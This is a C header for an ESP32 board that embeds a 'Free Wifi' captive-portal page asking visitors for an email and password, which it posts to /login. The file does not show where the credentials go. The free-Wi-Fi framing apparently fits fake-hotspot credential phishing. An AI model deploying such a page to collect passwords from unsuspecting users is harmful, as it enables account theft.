#ifndef HTML_CODE_H
#define HTML_CODE_H

inline const char index_html[] PROGMEM = R"=====(
<!DOCTYPE html>
<html>
  <head>
    <title>ESP32 Captive Portal</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <style>
      body {
        background-color: #434343;
        font-family: Arial, sans-serif;
        text-align: center;
      }

      h1 {
        color: white;
        font-size: 28px;
      }

      p {
        color: white;
        font-size: 16px;
      }

      form {
        background-color: white;
        border-radius: 10px;
        padding: 20px;
        display: inline-block;
        text-align: left;
      }

      label {
        display: block;
        color: #333;
      }

      input[type="text"],
      input[type="password"] {
        width: 80%;
        padding: 10px;
        margin: 10px 0;
        border: 1px solid #ccc;
        border-radius: 4px;
        font-size: 16px;
      }

      input[type="submit"] {
        background-color: #ffffff;
        color: white;
        padding: 10px 20px;
        border: none;
        border-radius: 4px;
        cursor: pointer;
      }

      input[type="submit"]:hover {
        background-color: #058b0c;
      }
    </style>
  </head>
  <body>
    <h1>Free Wifi</h1>
    <p>Create Account to get access</p>
    <form action="/login" method="POST">
      <label for="username">Email:</label>
      <input type="text" id="username" name="username" required />
      <label for="password">Password:</label>
      <input type="password" id="password" name="password" required />
      <button type="submit">Login</button>
    </form>
  </body>
</html>

)=====";

#endif